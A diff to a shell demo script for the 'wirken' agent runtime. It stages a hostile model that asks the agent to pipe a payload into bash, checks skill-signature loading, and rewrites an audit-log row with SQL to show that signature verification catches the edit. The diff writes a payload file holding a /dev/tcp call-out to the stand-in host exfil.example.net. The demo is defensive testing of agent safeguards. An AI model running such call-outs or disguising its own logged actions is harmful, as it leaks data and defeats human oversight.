@@ -149,25 +149,40 @@ else:
 PY
 }
 
-# The denial row the edit lands on, whether or not it has been edited
-# already. `exec` before the edit, `echo` after it.
+# The row the edit lands on: the model's exec call as the chain
+# recorded it. Every `ask` writes one, whatever the presenter answers,
+# and it is still an exec call after the edit, so a second `verify`
+# finds the same row.
 target_seq() {
     sqlite3 "$DB" "SELECT MIN(seq) FROM session_events
-                    WHERE payload LIKE '%\"kind\":\"permission_denied\"%'
-                      AND (payload LIKE '%\"tool\":\"exec\"%'
-                        OR payload LIKE '%\"tool\":\"echo\"%');"
+                    WHERE json_extract(payload, '\$.kind') = 'assistant_tool_calls'
+                      AND payload LIKE '%\"name\":\"exec\"%';"
 }
 
 # `audit verify` exits 1 on a broken chain, which is an answer and not
-# an error, so it runs outside `set -e`.
+# an error, so it runs outside `set -e`. The anchor warning is the same
+# paragraph every time; `quiet` leaves it out of the second block.
 run_verify() {
     local rc=0
-    "$WIRKEN" audit verify --require-signed --anchor "$ANCHOR" || rc=$?
+    if [ "${1:-}" = quiet ]; then
+        local report
+        report="$("$WIRKEN" audit verify --require-signed --anchor "$ANCHOR")" || rc=$?
+        printf '%s\n' "$report" | grep -v '^  WARNING (audit anchor)' || true
+    else
+        "$WIRKEN" audit verify --require-signed --anchor "$ANCHOR" || rc=$?
+    fi
     printf 'exit=%s\n' "$rc"
 }
 
 up() {
-    mkdir -p "$WIRKEN_DATA_DIR/skills"
+    mkdir -p "$WIRKEN_DATA_DIR/skills" "$WIRKEN_DATA_DIR/workspace"
+
+    # What turn 2 pipes into bash: a call-out to the same host turn 1
+    # tried. The workspace is what an approved exec sees as its working
+    # directory, so `./payload.sh` is this. Bash's own /dev/tcp rather
+    # than curl, because the default sandbox image has no curl and the
+    # line to show is the call-out failing, not a missing binary.
+    printf 'exec 3<>/dev/tcp/exfil.example.net/80\n' > "$WIRKEN_DATA_DIR/workspace/payload.sh"
 
     cat > "$WIRKEN_DATA_DIR/provider.json" <<JSON
 {
@@ -220,7 +235,9 @@ JSON
 # passing on each chunk of output puts every label above the prompt
 # it belongs to. Turn 1 is refused without a prompt and prints
 # nothing of its own, so the trace also prints the reason the chain
-# records for it.
+# records for it. After an approval it prints what the chain says
+# came of it: where an exec ran and the first line it wrote, or that
+# the tool was not found.
 ask() {
     listening || die "no hostile model on port $PORT; run 'up' first"
     # Assigned first: a `die` inside an argument's substitution would
@@ -268,6 +285,17 @@ def trace():
             for call in event.get("calls", []):
                 if call.get("name") in labels:
                     out.write(f"{labels[call['name']]}\n".encode())
+        elif kind == "permission_approved":
+            scope = str(event.get("scope", "")).replace("_", "-")
+            out.write(f"  approved, {scope}\n".encode())
+        elif kind == "tool_result" and event.get("sandbox"):
+            box = event["sandbox"]
+            first = (event.get("output") or "").splitlines()[:1]
+            out.write(f"  ran in {box.get('runtime')} {box.get('container_id')}\n".encode())
+            if first:
+                out.write(f"  {first[0]}\n".encode())
+        elif kind == "tool_result" and str(event.get("output")).startswith("tool not found:"):
+            out.write(b"  tool not found\n")
         elif kind == "skill_permission_denied":
             refused.add(event.get("requested"))
         elif kind == "tool_result" and event.get("tool_name") in refused:
@@ -302,23 +330,48 @@ sys.exit(child.wait())
 PY
 }
 
-# The loader logs its per-skill reason through tracing, which writes
-# to stdout beside the table, so the filter is on stdout and not on
-# stderr. NO_COLOR keeps the escape sequences out of what gets pasted.
-skills() {
-    asi ASI04
+# One line per bundle from `skills list`: the table row for a bundle
+# that loaded, and for one that did not, the loader's reason with the
+# timestamp and the paths cut. The loader logs that reason through
+# tracing, which writes to stdout beside the table. NO_COLOR keeps
+# escape sequences out of what gets parsed.
+skill_lines() {
     NO_COLOR=1 RUST_LOG=wirken_agent::skill=debug "$WIRKEN" skills list 2>/dev/null \
-        | grep 'Failed to load skill at'
+        | python3 -c '
+import re, sys
+for line in sys.stdin:
+    refused = re.search(r"skills/([^/]+)/SKILL\.md: skill load error: .* failed: (.*?)\. ", line)
+    if refused:
+        print(f"  {refused[1]:<17} refused: {refused[2]}")
+        continue
+    row = re.match(r"\s+(demo-\S+)\s.*\s(\S+)\s*$", line)
+    if row:
+        print(f"  {row[1]:<17} loads, {row[2]}")
+'
+}
+
+# Twice: once with the registry root moved aside, so only the
+# self-signed floor applies, and once with it back. A root left aside
+# by an interrupted run is put back first.
+skills() {
+    local root="$WIRKEN_DATA_DIR/registry-root.pub"
+    [ ! -f "$root.aside" ] || mv "$root.aside" "$root"
+    [ -f "$root" ] || die "no registry root in the scratch dir; run 'up' first"
+    asi ASI04
+    mv "$root" "$root.aside"
+    skill_lines
+    mv "$root.aside" "$root"
+    printf '\n'
+    skill_lines
 }
 
 verify() {
     [ -f "$DB" ] || die "no audit log yet; run 'ask' first"
     local seq
     seq="$(target_seq)"
-    # The edit lands on the denial row, which only an `ask` answered
-    # `n` leaves behind. A `y` pass approved the call, so there is
-    # none to make look boring.
-    [ -n "$seq" ] || die "no exec denial on the chain; run 'ask' and answer n"
+    # The edit rewrites what the model asked for: the pipe into bash
+    # goes, and the call reads as a look at a file.
+    [ -n "$seq" ] || die "no exec call on the chain; run 'ask' first"
 
     asi ASI10
     printf -- '── the chain as written ──\n'
@@ -336,14 +389,14 @@ verify() {
     printf -- '\n── one UPDATE at seq %s ──\n' "$seq"
     sqlite3 "$DB" \
         "UPDATE session_events
-            SET payload = replace(payload, '\"tool\":\"exec\"', '\"tool\":\"echo\"')
+            SET payload = replace(payload, '| bash', ' ')
           WHERE seq = $seq;"
     sqlite3 "$DB" \
-        "SELECT seq || '|' || substr(payload, 1, 72)
+        "SELECT seq || '|' || json_extract(payload, '\$.calls[0].arguments')
            FROM session_events WHERE seq = $seq;"
 
     printf -- '\n── the chain after the edit ──\n'
-    run_verify
+    run_verify quiet
 }
 
 # Stops whatever hostile_model.py is on the port, not only the pid
